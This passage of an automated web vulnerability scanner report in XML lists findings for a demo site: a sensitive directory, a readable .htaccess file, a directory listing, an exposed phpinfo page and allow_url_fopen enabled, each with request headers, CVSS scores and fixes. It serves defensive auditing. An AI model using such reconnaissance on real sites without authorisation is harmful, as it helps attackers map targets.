       <Name><![CDATA[Possible sensitive directories]]></Name>
       <ModuleName><![CDATA[Scripting (Possible_Sensitive_Directories.script)]]></ModuleName>
       <Details><![CDATA[No details are available.]]></Details>
       <Affects><![CDATA[/secured]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[This directory may expose sensitive information that could help a malicious user to prepare more advanced attacks.]]></Impact>
       <Description><![CDATA[A possible sensitive directory has been found. This directory is not directly linked from the website.This check looks for common sensitive resources like backup directories, database dumps, administration pages, temporary directories. Each one of these directories could help an attacker to learn more about his target.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Restrict access to this directory or remove it from the website.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /secured HTTP/1.1
Accept: acunetix/wvs
Range: bytes=0-99999
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm

]]></Request>
        <Response><![CDATA[HTTP/1.1 301 Moved Permanently
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:06:05 GMT
Content-Type: text/html
Content-Length: 184
Location: http://testphp.vulnweb.com/secured/
Connection: keep-alive
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Web Server Security and Database Server Security]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/webserver-security/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="91" color="orange">
       <Name><![CDATA[.htaccess file readable]]></Name>
       <ModuleName><![CDATA[Scripting (htaccess_File_Readable.script)]]></ModuleName>
       <Details><![CDATA[No details are available.]]></Details>
       <Affects><![CDATA[/Mod_Rewrite_Shop]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Possible sensitive information disclosure.]]></Impact>
       <Description><![CDATA[This directory contains an <b>.htaccess</b> file that is readable. This may indicate a server misconfiguration. htaccess files are designed to be parsed by web server and should not be directly accessible. These files could contain sensitive information that could help an attacker to conduct further attacks. It's recommended to restrict access to this file.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Restrict access to the .htaccess file by adjusting the web server configuration.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Mod_Rewrite_Shop/.htaccess HTTP/1.1
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:06:11 GMT
Content-Type: text/plain
Content-Length: 176
Last-Modified: Wed, 15 Feb 2012 10:32:40 GMT
Connection: keep-alive
ETag: &quot;4f3b89c8-b0&quot;
Accept-Ranges: bytes
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="92" color="blue">
       <Name><![CDATA[Possible sensitive files]]></Name>
       <ModuleName><![CDATA[Scripting (Possible_Sensitive_Files.script)]]></ModuleName>
       <Details><![CDATA[No details are available.]]></Details>
       <Affects><![CDATA[/Mod_Rewrite_Shop/.htaccess]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[This file may expose sensitive information that could help a malicious user to prepare more advanced attacks.]]></Impact>
       <Description><![CDATA[A possible sensitive file has been found. This file is not directly linked from the website. This check looks for common sensitive resources like password files, configuration files, log files, include files, statistics data, database dumps. Each one of these files could help an attacker to learn more about his target.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Restrict access to this file or remove it from the website.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Mod_Rewrite_Shop/.htaccess HTTP/1.1
Accept: acunetix/wvs
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:06:23 GMT
Content-Type: text/plain
Content-Length: 176
Last-Modified: Wed, 15 Feb 2012 10:32:40 GMT
Connection: keep-alive
ETag: &quot;4f3b89c8-b0&quot;
Accept-Ranges: bytes
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Web Server Security and Database Server Security]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/webserver-security/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="93" color="orange">
       <Name><![CDATA[Directory listing]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Listing.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;title&gt;Index of /Templates/&lt;/title&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/Templates]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Information]]></Type>
       <Impact><![CDATA[A user can view a list of all files from this directory possibly exposing sensitive information.]]></Impact>
       <Description><![CDATA[The web server is configured to display the list of files contained in this directory. This is not recommended because the directory may contain files that are not normally exposed through links on the web site.]]></Description>
       <DetailedInformation><![CDATA[<h2>How to disable directory listings</h2> <ul> <li>The easiest way to disable directory listing is to create an index file. The name of the index file depends on the web server configuration. On Apache is called index.htm, index.html. On IIS is named default.asp, default.aspx, default.htm.</li> <li>On IIS directory listings are disabled by default.</li> <li>For Apache you need to edit the Apache configuration file (usually named httpd.conf) or create an .htaccess file. In the configuration file you will have the definition of the directory. Something like   <pre wrap="virtual"><code>&lt;Directory  /directoryname/subdirectory&gt; Options Indexes FollowSymLinks ... &lt;/Directory&gt;</code></pre> To disable directory listing for that directory you need to remove the 'Indexes' option. </li> </ul>]]></DetailedInformation>
       <Recommendation><![CDATA[You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Templates/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/Templates/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:58 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 305
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Directory Listing and Information Disclosure]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/directory-listing-information-disclosure/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="94" color="orange">
       <Name><![CDATA[PHPinfo page]]></Name>
       <ModuleName><![CDATA[Scripting (PHPInfo.script)]]></ModuleName>
       <Details><![CDATA[phpinfo() page found at : <font color="dark">/secured/phpinfo.php</font>]]></Details>
       <Affects><![CDATA[/secured/phpinfo.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[This file may expose sensitive information that may help an malicious user to prepare more advanced attacks.]]></Impact>
       <Description><![CDATA[PHPinfo page has been found in this directory. The PHPinfo page outputs a large amount of information about the current state of PHP. This includes information about PHP compilation options and extensions, the PHP version, server information and environment (if compiled as a module), the PHP environment, OS version information, paths, master and local values of configuration options, HTTP headers, and the PHP License.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the file from production systems.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /secured/phpinfo.php HTTP/1.1
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:06:53 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 45963
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP phpinfo]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/function.phpinfo.php]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="95" color="orange">
       <Name><![CDATA[PHP allow_url_fopen enabled]]></Name>
       <ModuleName><![CDATA[Scripting (PHPInfo.script)]]></ModuleName>
       <Details><![CDATA[This vulnerability was detected using the information from phpinfo() page <font color="dark">/secured/phpinfo.php</font><br/>allow_url_fopen: <font color="dark"><b>On</b></font>]]></Details>
       <Affects><![CDATA[/secured/phpinfo.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[Application dependant - possible remote file inclusion.]]></Impact>
       <Description><![CDATA[The PHP configuration directive allow_url_fopen is enabled. When enabled, this directive allows data retrieval from remote locations (web site or FTP server). A large number of code injection vulnerabilities reported in PHP-based web applications are caused by the combination of enabling allow_url_fopen and bad input filtering. <br/><br/>allow_url_fopen is enabled by default.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[You can disable allow_url_fopen from php.ini or .htaccess.<br/><br/><b>php.ini</b><br/>allow_url_fopen = 'off'<br/><br/><b>.htaccess</b><br/>php_flag  allow_url_fopen off<br/>]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /secured/phpinfo.php HTTP/1.1
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:06:53 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 45963
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
